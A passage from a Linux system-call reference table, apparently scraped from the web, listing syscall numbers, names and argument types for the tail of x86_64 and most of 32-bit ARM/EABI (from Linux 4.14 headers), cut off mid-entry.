man/ cs/ 0xe2 timer_t timer_id - - - - - 227 clock_settime man/ cs/ 0xe3 clockid_t which_clock const struct __kernel_timespec *tp - - - - 228 clock_gettime man/ cs/ 0xe4 clockid_t which_clock struct __kernel_timespec *tp - - - - 229 clock_getres man/ cs/ 0xe5 clockid_t which_clock struct __kernel_timespec *tp - - - - 230 clock_nanosleep man/ cs/ 0xe6 clockid_t which_clock int flags const struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - 231 exit_group man/ cs/ 0xe7 int error_code - - - - - 232 epoll_wait man/ cs/ 0xe8 int epfd struct epoll_event *events int maxevents int timeout - - 233 epoll_ctl man/ cs/ 0xe9 int epfd int op int fd struct epoll_event *event - - 234 tgkill man/ cs/ 0xea pid_t tgid pid_t pid int sig - - - 235 utimes man/ cs/ 0xeb char *filename struct timeval *utimes - - - - 236 vserver man/ cs/ 0xec ? ? ? ? ? ? 237 mbind man/ cs/ 0xed unsigned long start unsigned long len unsigned long mode const unsigned long *nmask unsigned long maxnode unsigned flags 238 set_mempolicy man/ cs/ 0xee int mode const unsigned long *nmask unsigned long maxnode - - - 239 get_mempolicy man/ cs/ 0xef int *policy unsigned long *nmask unsigned long maxnode unsigned long addr unsigned long flags - 240 mq_open man/ cs/ 0xf0 const char *name int oflag umode_t mode struct mq_attr *attr - - 241 mq_unlink man/ cs/ 0xf1 const char *name - - - - - 242 mq_timedsend man/ cs/ 0xf2 mqd_t mqdes const char *msg_ptr size_t msg_len unsigned int msg_prio const struct __kernel_timespec *abs_timeout - 243 mq_timedreceive man/ cs/ 0xf3 mqd_t mqdes char *msg_ptr size_t msg_len unsigned int *msg_prio const struct __kernel_timespec *abs_timeout - 244 mq_notify man/ cs/ 0xf4 mqd_t mqdes const struct sigevent *notification - - - - 245 mq_getsetattr man/ cs/ 0xf5 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat - - - 246 kexec_load man/ cs/ 0xf6 unsigned long entry unsigned long nr_segments struct kexec_segment *segments unsigned long flags - - 247 waitid man/ cs/ 0xf7 int which pid_t pid struct siginfo *infop int options struct rusage *ru - 248 add_key man/ cs/ 0xf8 const char *_type const char *_description const void *_payload size_t plen key_serial_t destringid - 249 request_key man/ cs/ 0xf9 const char *_type const char *_description const char *_callout_info key_serial_t destringid - - 250 keyctl man/ cs/ 0xfa int cmd unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 251 ioprio_set man/ cs/ 0xfb int which int who int ioprio - - - 252 ioprio_get man/ cs/ 0xfc int which int who - - - - 253 inotify_init man/ cs/ 0xfd - - - - - - 254 inotify_add_watch man/ cs/ 0xfe int fd const char *path u32 mask - - - 255 inotify_rm_watch man/ cs/ 0xff int fd __s32 wd - - - - 256 migrate_pages man/ cs/ 0x100 pid_t pid unsigned long maxnode const unsigned long *from const unsigned long *to - - 257 openat man/ cs/ 0x101 int dfd const char *filename int flags umode_t mode - - 258 mkdirat man/ cs/ 0x102 int dfd const char * pathname umode_t mode - - - 259 mknodat man/ cs/ 0x103 int dfd const char * filename umode_t mode unsigned dev - - 260 fchownat man/ cs/ 0x104 int dfd const char *filename uid_t user gid_t group int flag - 261 futimesat man/ cs/ 0x105 int dfd const char *filename struct timeval *utimes - - - 262 newfstatat man/ cs/ 0x106 int dfd const char *filename struct stat *statbuf int flag - - 263 unlinkat man/ cs/ 0x107 int dfd const char * pathname int flag - - - 264 renameat man/ cs/ 0x108 int olddfd const char * oldname int newdfd const char * newname - - 265 linkat man/ cs/ 0x109 int olddfd const char *oldname int newdfd const char *newname int flags - 266 symlinkat man/ cs/ 0x10a const char * oldname int newdfd const char * newname - - - 267 readlinkat man/ cs/ 0x10b int dfd const char *path char *buf int bufsiz - - 268 fchmodat man/ cs/ 0x10c int dfd const char * filename umode_t mode - - - 269 faccessat man/ cs/ 0x10d int dfd const char *filename int mode - - - 270 pselect6 man/ cs/ 0x10e int fd_set * fd_set * fd_set * struct __kernel_timespec * void * 271 ppoll man/ cs/ 0x10f struct pollfd * unsigned int struct __kernel_timespec * const sigset_t * size_t - 272 unshare man/ cs/ 0x110 unsigned long unshare_flags - - - - - 273 set_robust_list man/ cs/ 0x111 struct robust_list_head *head size_t len - - - - 274 get_robust_list man/ cs/ 0x112 int pid struct robust_list_head head_ptr size_t *len_ptr - - - 275 splice man/ cs/ 0x113 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 276 tee man/ cs/ 0x114 int fdin int fdout size_t len unsigned int flags - - 277 sync_file_range man/ cs/ 0x115 int fd loff_t offset loff_t nbytes unsigned int flags - - 278 vmsplice man/ cs/ 0x116 int fd const struct iovec *iov unsigned long nr_segs unsigned int flags - - 279 move_pages man/ cs/ 0x117 pid_t pid unsigned long nr_pages const void pages const int *nodes int *status int flags 280 utimensat man/ cs/ 0x118 int dfd const char *filename struct __kernel_timespec *utimes int flags - - 281 epoll_pwait man/ cs/ 0x119 int epfd struct epoll_event *events int maxevents int timeout const sigset_t *sigmask size_t sigsetsize 282 signalfd man/ cs/ 0x11a int ufd sigset_t *user_mask size_t sizemask - - - 283 timerfd_create man/ cs/ 0x11b int clockid int flags - - - - 284 eventfd man/ cs/ 0x11c unsigned int count - - - - - 285 fallocate man/ cs/ 0x11d int fd int mode loff_t offset loff_t len - - 286 timerfd_settime man/ cs/ 0x11e int ufd int flags const struct __kernel_itimerspec *utmr struct __kernel_itimerspec *otmr - - 287 timerfd_gettime man/ cs/ 0x11f int ufd struct __kernel_itimerspec *otmr - - - - 288 accept4 man/ cs/ 0x120 int struct sockaddr * int * int - - 289 signalfd4 man/ cs/ 0x121 int ufd sigset_t *user_mask size_t sizemask int flags - - 290 eventfd2 man/ cs/ 0x122 unsigned int count int flags - - - - 291 epoll_create1 man/ cs/ 0x123 int flags - - - - - 292 dup3 man/ cs/ 0x124 unsigned int oldfd unsigned int newfd int flags - - - 293 pipe2 man/ cs/ 0x125 int *fildes int flags - - - - 294 inotify_init1 man/ cs/ 0x126 int flags - - - - - 295 preadv man/ cs/ 0x127 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 296 pwritev man/ cs/ 0x128 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 297 rt_tgsigqueueinfo man/ cs/ 0x129 pid_t tgid pid_t pid int sig siginfo_t *uinfo - - 298 perf_event_open man/ cs/ 0x12a struct perf_event_attr *attr_uptr pid_t pid int cpu int group_fd unsigned long flags - 299 recvmmsg man/ cs/ 0x12b int fd struct mmsghdr *msg unsigned int vlen unsigned flags struct __kernel_timespec *timeout - 300 fanotify_init man/ cs/ 0x12c unsigned int flags unsigned int event_f_flags - - - - 301 fanotify_mark man/ cs/ 0x12d int fanotify_fd unsigned int flags u64 mask int fd const char *pathname - 302 prlimit64 man/ cs/ 0x12e pid_t pid unsigned int resource const struct rlimit64 *new_rlim struct rlimit64 *old_rlim - - 303 name_to_handle_at man/ cs/ 0x12f int dfd const char *name struct file_handle *handle int *mnt_id int flag - 304 open_by_handle_at man/ cs/ 0x130 int mountdirfd struct file_handle *handle int flags - - - 305 clock_adjtime man/ cs/ 0x131 clockid_t which_clock struct __kernel_timex *tx - - - - 306 syncfs man/ cs/ 0x132 int fd - - - - - 307 sendmmsg man/ cs/ 0x133 int fd struct mmsghdr *msg unsigned int vlen unsigned flags - - 308 setns man/ cs/ 0x134 int fd int nstype - - - - 309 getcpu man/ cs/ 0x135 unsigned *cpu unsigned *node struct getcpu_cache *cache - - - 310 process_vm_readv man/ cs/ 0x136 pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 311 process_vm_writev man/ cs/ 0x137 pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 312 kcmp man/ cs/ 0x138 pid_t pid1 pid_t pid2 int type unsigned long idx1 unsigned long idx2 - 313 finit_module man/ cs/ 0x139 int fd const char *uargs int flags - - - 314 sched_setattr man/ cs/ 0x13a pid_t pid struct sched_attr *attr unsigned int flags - - - 315 sched_getattr man/ cs/ 0x13b pid_t pid struct sched_attr *attr unsigned int size unsigned int flags - - 316 renameat2 man/ cs/ 0x13c int olddfd const char *oldname int newdfd const char *newname unsigned int flags - 317 seccomp man/ cs/ 0x13d unsigned int op unsigned int flags void *uargs - - - 318 getrandom man/ cs/ 0x13e char *buf size_t count unsigned int flags - - - 319 memfd_create man/ cs/ 0x13f const char *uname_ptr unsigned int flags - - - - 320 kexec_file_load man/ cs/ 0x140 int kernel_fd int initrd_fd unsigned long cmdline_len const char *cmdline_ptr unsigned long flags - 321 bpf man/ cs/ 0x141 int cmd union bpf_attr *attr unsigned int size - - - 322 execveat man/ cs/ 0x142 int dfd const char *filename const char const argv const char const envp int flags - 323 userfaultfd man/ cs/ 0x143 int flags - - - - - 324 membarrier man/ cs/ 0x144 int cmd int flags - - - - 325 mlock2 man/ cs/ 0x145 unsigned long start size_t len int flags - - - 326 copy_file_range man/ cs/ 0x146 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 327 preadv2 man/ cs/ 0x147 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 328 pwritev2 man/ cs/ 0x148 unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 329 pkey_mprotect man/ cs/ 0x149 unsigned long start size_t len unsigned long prot int pkey - - 330 pkey_alloc man/ cs/ 0x14a unsigned long flags unsigned long init_val - - - - 331 pkey_free man/ cs/ 0x14b int pkey - - - - - 332 statx man/ cs/ 0x14c int dfd const char *path unsigned flags unsigned mask struct statx *buffer - arm (32-bit/EABI)Compiled from Linux 4.14.0 headers. NR syscall name references %r7 arg0 (%r0) arg1 (%r1) arg2 (%r2) arg3 (%r3) arg4 (%r4) arg5 (%r5) 0 restart_syscall man/ cs/ 0x00 - - - - - - 1 exit man/ cs/ 0x01 int error_code - - - - - 2 fork man/ cs/ 0x02 - - - - - - 3 read man/ cs/ 0x03 unsigned int fd char *buf size_t count - - - 4 write man/ cs/ 0x04 unsigned int fd const char *buf size_t count - - - 5 open man/ cs/ 0x05 const char *filename int flags umode_t mode - - - 6 close man/ cs/ 0x06 unsigned int fd - - - - - 7 not implemented 0x07 8 creat man/ cs/ 0x08 const char *pathname umode_t mode - - - - 9 link man/ cs/ 0x09 const char *oldname const char *newname - - - - 10 unlink man/ cs/ 0x0a const char *pathname - - - - - 11 execve man/ cs/ 0x0b const char *filename const char const argv const char const envp - - - 12 chdir man/ cs/ 0x0c const char *filename - - - - - 13 not implemented 0x0d 14 mknod man/ cs/ 0x0e const char *filename umode_t mode unsigned dev - - - 15 chmod man/ cs/ 0x0f const char *filename umode_t mode - - - - 16 lchown man/ cs/ 0x10 const char *filename uid_t user gid_t group - - - 17 not implemented 0x11 18 not implemented 0x12 19 lseek man/ cs/ 0x13 unsigned int fd off_t offset unsigned int whence - - - 20 getpid man/ cs/ 0x14 - - - - - - 21 mount man/ cs/ 0x15 char *dev_name char *dir_name char *type unsigned long flags void *data - 22 not implemented 0x16 23 setuid man/ cs/ 0x17 uid_t uid - - - - - 24 getuid man/ cs/ 0x18 - - - - - - 25 not implemented 0x19 26 ptrace man/ cs/ 0x1a long request long pid unsigned long addr unsigned long data - - 27 not implemented 0x1b 28 not implemented 0x1c 29 pause man/ cs/ 0x1d - - - - - - 30 not implemented 0x1e 31 not implemented 0x1f 32 not implemented 0x20 33 access man/ cs/ 0x21 const char *filename int mode - - - - 34 nice man/ cs/ 0x22 int increment - - - - - 35 not implemented 0x23 36 sync man/ cs/ 0x24 - - - - - - 37 kill man/ cs/ 0x25 pid_t pid int sig - - - - 38 rename man/ cs/ 0x26 const char *oldname const char *newname - - - - 39 mkdir man/ cs/ 0x27 const char *pathname umode_t mode - - - - 40 rmdir man/ cs/ 0x28 const char *pathname - - - - - 41 dup man/ cs/ 0x29 unsigned int fildes - - - - - 42 pipe man/ cs/ 0x2a int *fildes - - - - - 43 times man/ cs/ 0x2b struct tms *tbuf - - - - - 44 not implemented 0x2c 45 brk man/ cs/ 0x2d unsigned long brk - - - - - 46 setgid man/ cs/ 0x2e gid_t gid - - - - - 47 getgid man/ cs/ 0x2f - - - - - - 48 not implemented 0x30 49 geteuid man/ cs/ 0x31 - - - - - - 50 getegid man/ cs/ 0x32 - - - - - - 51 acct man/ cs/ 0x33 const char *name - - - - - 52 umount2 man/ cs/ 0x34 ? ? ? ? ? ? 53 not implemented 0x35 54 ioctl man/ cs/ 0x36 unsigned int fd unsigned int cmd unsigned long arg - - - 55 fcntl man/ cs/ 0x37 unsigned int fd unsigned int cmd unsigned long arg - - - 56 not implemented 0x38 57 setpgid man/ cs/ 0x39 pid_t pid pid_t pgid - - - - 58 not implemented 0x3a 59 not implemented 0x3b 60 umask man/ cs/ 0x3c int mask - - - - - 61 chroot man/ cs/ 0x3d const char *filename - - - - - 62 ustat man/ cs/ 0x3e unsigned dev struct ustat *ubuf - - - - 63 dup2 man/ cs/ 0x3f unsigned int oldfd unsigned int newfd - - - - 64 getppid man/ cs/ 0x40 - - - - - - 65 getpgrp man/ cs/ 0x41 - - - - - - 66 setsid man/ cs/ 0x42 - - - - - - 67 sigaction man/ cs/ 0x43 int const struct old_sigaction * struct old_sigaction * - - - 68 not implemented 0x44 69 not implemented 0x45 70 setreuid man/ cs/ 0x46 uid_t ruid uid_t euid - - - - 71 setregid man/ cs/ 0x47 gid_t rgid gid_t egid - - - - 72 sigsuspend man/ cs/ 0x48 int unused1 int unused2 old_sigset_t mask - - - 73 sigpending man/ cs/ 0x49 old_sigset_t *uset - - - - - 74 sethostname man/ cs/ 0x4a char *name int len - - - - 75 setrlimit man/ cs/ 0x4b unsigned int resource struct rlimit *rlim - - - - 76 not implemented 0x4c 77 getrusage man/ cs/ 0x4d int who struct rusage *ru - - - - 78 gettimeofday man/ cs/ 0x4e struct timeval *tv struct timezone *tz - - - - 79 settimeofday man/ cs/ 0x4f struct timeval *tv struct timezone *tz - - - - 80 getgroups man/ cs/ 0x50 int gidsetsize gid_t *grouplist - - - - 81 setgroups man/ cs/ 0x51 int gidsetsize gid_t *grouplist - - - - 82 not implemented 0x52 83 symlink man/ cs/ 0x53 const char *old const char *new - - - - 84 not implemented 0x54 85 readlink man/ cs/ 0x55 const char *path char *buf int bufsiz - - - 86 uselib man/ cs/ 0x56 const char *library - - - - - 87 swapon man/ cs/ 0x57 const char *specialfile int swap_flags - - - - 88 reboot man/ cs/ 0x58 int magic1 int magic2 unsigned int cmd void *arg - - 89 not implemented 0x59 90 not implemented 0x5a 91 munmap man/ cs/ 0x5b unsigned long addr size_t len - - - - 92 truncate man/ cs/ 0x5c const char *path long length - - - - 93 ftruncate man/ cs/ 0x5d unsigned int fd unsigned long length - - - - 94 fchmod man/ cs/ 0x5e unsigned int fd umode_t mode - - - - 95 fchown man/ cs/ 0x5f unsigned int fd uid_t user gid_t group - - - 96 getpriority man/ cs/ 0x60 int which int who - - - - 97 setpriority man/ cs/ 0x61 int which int who int niceval - - - 98 not implemented 0x62 99 statfs man/ cs/ 0x63 const char * path struct statfs *buf - - - - 100 fstatfs man/ cs/ 0x64 unsigned int fd struct statfs *buf - - - - 101 not implemented 0x65 102 not implemented 0x66 103 syslog man/ cs/ 0x67 int type char *buf int len - - - 104 setitimer man/ cs/ 0x68 int which struct itimerval *value struct itimerval *ovalue - - - 105 getitimer man/ cs/ 0x69 int which struct itimerval *value - - - - 106 stat man/ cs/ 0x6a const char *filename struct __old_kernel_stat *statbuf - - - - 107 lstat man/ cs/ 0x6b const char *filename struct __old_kernel_stat *statbuf - - - - 108 fstat man/ cs/ 0x6c unsigned int fd struct __old_kernel_stat *statbuf - - - - 109 not implemented 0x6d 110 not implemented 0x6e 111 vhangup man/ cs/ 0x6f - - - - - - 112 not implemented 0x70 113 not implemented 0x71 114 wait4 man/ cs/ 0x72 pid_t pid int *stat_addr int options struct rusage *ru - - 115 swapoff man/ cs/ 0x73 const char *specialfile - - - - - 116 sysinfo man/ cs/ 0x74 struct sysinfo *info - - - - - 117 not implemented 0x75 118 fsync man/ cs/ 0x76 unsigned int fd - - - - - 119 sigreturn man/ cs/ 0x77 ? ? ? ? ? ? 120 clone man/ cs/ 0x78 unsigned long unsigned long int * int * unsigned long - 121 setdomainname man/ cs/ 0x79 char *name int len - - - - 122 uname man/ cs/ 0x7a struct old_utsname * - - - - - 123 not implemented 0x7b 124 adjtimex man/ cs/ 0x7c struct __kernel_timex *txc_p - - - - - 125 mprotect man/ cs/ 0x7d unsigned long start size_t len unsigned long prot - - - 126 sigprocmask man/ cs/ 0x7e int how old_sigset_t *set old_sigset_t *oset - - - 127 not implemented 0x7f 128 init_module man/ cs/ 0x80 void *umod unsigned long len const char *uargs - - - 129 delete_module man/ cs/ 0x81 const char *name_user unsigned int flags - - - - 130 not implemented 0x82 131 quotactl man/ cs/ 0x83 unsigned int cmd const char *special qid_t id void *addr - - 132 getpgid man/ cs/ 0x84 pid_t pid - - - - - 133 fchdir man/ cs/ 0x85 unsigned int fd - - - - - 134 bdflush man/ cs/ 0x86 int func long data - - - - 135 sysfs man/ cs/ 0x87 int option unsigned long arg1 unsigned long arg2 - - - 136 personality man/ cs/ 0x88 unsigned int personality - - - - - 137 not implemented 0x89 138 setfsuid man/ cs/ 0x8a uid_t uid - - - - - 139 setfsgid man/ cs/ 0x8b gid_t gid - - - - - 140 _llseek man/ cs/ 0x8c ? ? ? ? ? ? 141 getdents man/ cs/ 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count - - - 142 _newselect man/ cs/ 0x8e ? ? ? ? ? ? 143 flock man/ cs/ 0x8f unsigned int fd unsigned int cmd - - - - 144 msync man/ cs/ 0x90 unsigned long start size_t len int flags - - - 145 readv man/ cs/ 0x91 unsigned long fd const struct iovec *vec unsigned long vlen - - - 146 writev man/ cs/ 0x92 unsigned long fd const struct iovec *vec unsigned long vlen - - - 147 getsid man/ cs/ 0x93 pid_t pid - - - - - 148 fdatasync man/ cs/ 0x94 unsigned int fd - - - - - 149 _sysctl man/ cs/ 0x95 ? ? ? ? ? ? 150 mlock man/ cs/ 0x96 unsigned long start size_t len - - - - 151 munlock man/ cs/ 0x97 unsigned long start size_t len - - - - 152 mlockall man/ cs/ 0x98 int flags - - - - - 153 munlockall man/ cs/ 0x99 - - - - - - 154 sched_setparam man/ cs/ 0x9a pid_t pid struct sched_param *param - - - - 155 sched_getparam man/ cs/ 0x9b pid_t pid struct sched_param *param - - - - 156 sched_setscheduler man/ cs/ 0x9c pid_t pid int policy struct sched_param *param - - - 157 sched_getscheduler man/ cs/ 0x9d pid_t pid - - - - - 158 sched_yield man/ cs/ 0x9e - - - - - - 159 sched_get_priority_max man/ cs/ 0x9f int policy - - - - - 160 sched_get_priority_min man/ cs/ 0xa0 int policy - - - - - 161 sched_rr_get_interval man/ cs/ 0xa1 pid_t pid struct __kernel_timespec *interval - - - - 162 nanosleep man/ cs/ 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - - - 163 mremap man/ cs/ 0xa3 unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr - 164 setresuid man/ cs/ 0xa4 uid_t ruid uid_t euid uid_t suid - - - 165 getresuid man/ cs/ 0xa5 uid_t *ruid uid_t *euid uid_t *suid - - - 166 not implemented 0xa6 167 not implemented 0xa7 168 poll man/ cs/ 0xa8 struct pollfd *ufds unsigned int nfds int timeout - - - 169 nfsservctl man/ cs/ 0xa9 ? ? ? ? ? ? 170 setresgid man/ cs/ 0xaa gid_t rgid gid_t egid gid_t sgid - - - 171 getresgid man/ cs/ 0xab gid_t *rgid gid_t *egid gid_t *sgid - - - 172 prctl man/ cs/ 0xac int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 173 rt_sigreturn man/ cs/ 0xad ? ? ? ? ? ? 174 rt_sigaction man/ cs/ 0xae int const struct sigaction * struct sigaction * size_t - - 175 rt_sigprocmask man/ cs/ 0xaf int how sigset_t *set sigset_t *oset size_t sigsetsize - - 176 rt_sigpending man/ cs/ 0xb0 sigset_t *set size_t sigsetsize - - - - 177 rt_sigtimedwait man/ cs/ 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts size_t sigsetsize - - 178 rt_sigqueueinfo man/ cs/ 0xb2 pid_t pid int sig siginfo_t *uinfo - - - 179 rt_sigsuspend man/ cs/ 0xb3 sigset_t *unewset size_t sigsetsize - - - - 180 pread64 man/ cs/ 0xb4 unsigned int fd char *buf size_t count loff_t pos - - 181 pwrite64 man/ cs/ 0xb5 unsigned int fd const char *buf size_t count loff_t pos - - 182 chown man/ cs/ 0xb6 const char *filename uid_t user gid_t group - - - 183 getcwd man/ cs/ 0xb7 char *buf unsigned long size - - - - 184 capget man/ cs/ 0xb8 cap_user_header_t header cap_user_data_t dataptr - - - - 185 capset man/ cs/ 0xb9 cap_user_header_t header const cap_user_data_t data - - - - 186 sigaltstack man/ cs/ 0xba const struct sigaltstack *uss struct sigaltstack *uoss - - - - 187 sendfile man/ cs/ 0xbb int out_fd int in_fd off_t *offset size_t count - - 188 not implemented 0xbc 189 not implemented 0xbd 190 vfork man/ cs/ 0xbe - - - - - - 191 ugetrlimit man/ cs/ 0xbf ? ? ? ? ? ? 192 mmap2 man/ cs/ 0xc0 ? ? ? ? ? ? 193 truncate64 man/ cs/ 0xc1 const char *path loff_t length - - - - 194 ftruncate64 man/ cs/ 0xc2 unsigned int fd loff_t length - - - - 195 stat64 man/ cs/ 0xc3 const char *filename struct stat64 *statbuf - - - - 196 lstat64 man/ cs/ 0xc4 const char *filename struct stat64 *statbuf - - - - 197 fstat64 man/ cs/ 0xc5 unsigned long fd struct stat64 *statbuf - - - - 198 lchown32 man/ cs/ 0xc6 ? ? ? ? ? ? 199 getuid32 man/ cs/ 0xc7 ? ? ? ? ? ? 200 getgid32 man/ cs/ 0xc8 ? ? ? ? ? ? 201 geteuid32 man/ cs/ 0xc9 ? ? ? ? ? ? 202 getegid32 man/ cs/ 0xca ? ? ? ? ? ? 203 setreuid32 man/ cs/ 0xcb ? ? ? ? ? ? 204 setregid32 man/ cs/ 0xcc ? ? ? ? ? ? 205 getgroups32 man/ cs/ 0xcd ? ? ? ? ? ? 206 setgroups32 man/ cs/ 0xce ? ? ? ? ? ? 207 fchown32 man/ cs/ 0xcf ? ? ? ? ? ? 208 setresuid32 man/ cs/ 0xd0 ? ? ? ? ? ? 209 getresuid32 man/ cs/ 0xd1 ? ? ? ? ? ? 210 setresgid32 man/ cs/ 0xd2 ? ? ? ? ? ? 211 getresgid32 man/ cs/ 0xd3 ? ? ? ? ? ? 212 chown32 man/ cs/ 0xd4 ? ? ? ? ? ? 213 setuid32 man/ cs/ 0xd5 ? ? ? ? ? ? 214 setgid32 man/ cs/ 0xd6 ? ? ? ? ? ? 215 setfsuid32 man/ cs/ 0xd7 ? ? ? ? ? ? 216 setfsgid32 man/ cs/ 0xd8 ? ? ? ? ? ? 217 getdents64 man/ cs/ 0xd9 unsigned int fd struct linux_dirent64 *dirent unsigned int count - - - 218 pivot_root man/ cs/ 0xda const char *new_root const char *put_old - - - - 219 mincore man/ cs/ 0xdb unsigned long start size_t len unsigned char * vec - - - 220 madvise man/ cs/ 0xdc unsigned long start size_t len int behavior - - - 221 fcntl64 man/ cs/ 0xdd unsigned int fd unsigned int cmd unsigned long arg - - - 222 not implemented 0xde 223 not implemented 0xdf 224 gettid man/ cs/ 0xe0 - - - - - - 225 readahead man/ cs/ 0xe1 int fd loff_t offset size_t count - - - 226 setxattr man/ cs/ 0xe2 const char *path const char *name const void *value size_t size int flags - 227 lsetxattr man/ cs/ 0xe3 const char *path const char *name const void *value size_t size int flags - 228 fsetxattr man/ cs/ 0xe4 int fd const char *name const void *value size_t size int flags - 229 getxattr man/ cs/ 0xe5 const char *path const char *name void *value size_t size - - 230 lgetxattr man/ cs/ 0xe6 const char *path const char *name void *value size_t size - - 231 fgetxattr man/ cs/ 0xe7 int fd const char *name void *value size_t size - - 232 listxattr man/ cs/ 0xe8 const char *path char *list size_t size - - - 233 llistxattr man/ cs/ 0xe9 const char *path char *list size_t size - - - 234 flistxattr man/ cs/ 0xea int fd char *list size_t size - - - 235 removexattr man/ cs/ 0xeb const char *path const char *name - - - - 236 lremovexattr man/ cs/ 0xec const char *path const char *name - - - - 237 fremovexattr man/ cs/ 0xed int fd const char *name - - - - 238 tkill man/ cs/ 0xee pid_t pid int sig - - - - 239 sendfile64 man/ cs/ 0xef int out_fd int in_fd loff_t *offset size_t count - - 240 futex man/ cs/ 0xf0 u32 *uaddr int op u32 val struct __kernel_timespec *utime u32 *uaddr2 u32 val3 241 sched_setaffinity man/ cs/ 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 242 sched_getaffinity man/ cs/ 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 243 io_setup man/ cs/ 0xf3 unsigned nr_reqs aio_context_t *ctx - - - - 244 io_destroy man/ cs/ 0xf4 aio_context_t ctx - - - - - 245 io_getevents man/ cs/ 0xf5 aio_context_t ctx_id long min_nr long nr struct io_event *events struct __kernel_timespec *timeout - 246 io_submit man/ cs/ 0xf6 aio_context_t long struct iocb - - - 247 io_cancel man/ cs/ 0xf7 aio_context_t ctx_id struct iocb *iocb struct io_event *result - - - 248 exit_group man/ cs/ 0xf8 int error_code - - - - - 249 lookup_dcookie man/ cs/ 0xf9 u64 cookie64 char *buf size_t len - - - 250 epoll_create man/ cs/ 0xfa int size - - - - - 251 epoll_ctl man/ cs/ 0xfb int epfd int op int fd struct epoll_event *event - - 252 epoll_wait man/ cs/ 0xfc int epfd struct epoll_event *events int maxevents int timeout - - 253 remap_file_pages man/ cs/ 0xfd unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags - 254 not implemented 0xfe 255 not implemented 0xff 256 set_tid_address man/ cs/ 0x100 int *tidptr - - - - - 257 timer_create man/ cs/ 0x101 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id - - - 258 timer_settime man/ cs/ 0x102 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting struct __kernel_itimerspec *old_setting - - 259 timer_gettime man/ cs/ 0x103 timer_t timer_id struct __kernel_itimerspec *setting - - - - 260 timer_getoverrun man/ cs/ 0x104 timer_t timer_id - - - - - 261 timer_delete man/ cs/ 0x105 timer_t timer_id - - - - - 262 clock_settime man/ cs/ 0x106 clockid_t which_clock const struct __kernel_timespec *tp - - - - 263 clock_gettime man/ cs/ 0x107 clockid_t which_clock struct __kernel_timespec *tp - - - - 264 clock_getres man/ cs/ 0x108 clockid_t which_clock struct __kernel_timespec *tp - - - - 265 clock_nanosleep man/ cs/ 0x109 clockid_t which_clock int flags const struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - 266 statfs64 man/ cs/ 0x10a const char *path size_t sz struct statfs64 *buf - - - 267 fstatfs64 man/ cs/ 0x10b unsigned int fd size_t sz struct statfs64 *buf - - - 268 tgkill man/ cs/ 0x10c pid_t tgid pid_t pid int sig - - - 269 utimes man/ cs/ 0x10d char *filename struct timeval *utimes - - - - 270 arm_fadvise64_64 man/ cs/ 0x10e ? ? ? ? ? ? 271 pciconfig_iobase man/ cs/ 0x10f long which unsigned long bus unsigned long devfn - - - 272 pciconfig_read man/ cs/ 0x110 unsigned long bus unsigned long dfn unsigned long off unsigned long len void *buf - 273 pciconfig_write man/ cs/ 0x111 unsigned long bus unsigned long dfn unsigned long off unsigned long len void *buf - 274 mq_open man/ cs/ 0x112 const char *name int oflag umode_t mode struct mq_attr *attr - - 275 mq_unlink man/ cs/ 0x113 const char *name - - - - - 276 mq_timedsend man/ cs/ 0x114 mqd_t mqdes const char *msg_ptr size_t msg_len unsigned int msg_prio const struct __kernel_timespec *abs_timeout - 277 mq_timedreceive man/ cs/ 0x115 mqd_t mqdes char *msg_ptr size_t msg_len unsigned int *msg_prio const struct __kernel_timespec *abs_timeout - 278 mq_notify man/ cs/ 0x116 mqd_t mqdes const struct sigevent *notification - - - - 279 mq_getsetattr man/ cs/ 0x117 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat - - - 280 waitid man/ cs/ 0x118 int which pid_t pid struct siginfo *infop int options struct rusage *ru - 281 socket man/ cs/ 0x119 int int int - - - 282 bind man/ cs/ 0x11a int struct sockaddr * int - - - 283 connect man/ cs/ 0x11b int struct sockaddr * int - - - 284 listen man/ cs/ 0x11c int int - - - - 285 accept man/ cs/ 0x11d int struct sockaddr * int * - - - 286 getsockname man/ cs/ 0x11e int struct sockaddr * int * - - - 287 getpeername man/ cs/ 0x11f int struct sockaddr * int * - - - 288 socketpair man/ cs/ 0x120 int int int int * - - 289 send man/ cs/ 0x121 int void * size_t unsigned - - 290 sendto man/ cs/ 0x122 int void * size_t unsigned struct sockaddr * int 291 recv man/ cs/ 0x123 int void * size_t unsigned - - 292 recvfrom man/ cs/ 0x124 int void * size_t unsigned struct sockaddr * int * 293 shutdown man/ cs/ 0x125 int int - - - - 294 setsockopt man/ cs/ 0x126 int fd int level int optname char *optval int optlen - 295 getsockopt man/ cs/ 0x127 int fd int level int optname char *optval int *optlen - 296 sendmsg man/ cs/ 0x128 int fd struct user_msghdr *msg unsigned flags - - - 297 recvmsg man/ cs/ 0x129 int fd struct user_msghdr *msg unsigned flags - - - 298 semop man/ cs/ 0x12a int semid struct sembuf *sops unsigned nsops - - - 299 semget man/ cs/ 0x12b key_t key int nsems int semflg - - - 300 semctl man/ cs/ 0x12c int semid int semnum int cmd unsigned long arg - - 301 msgsnd man/ cs/ 0x12d int msqid struct 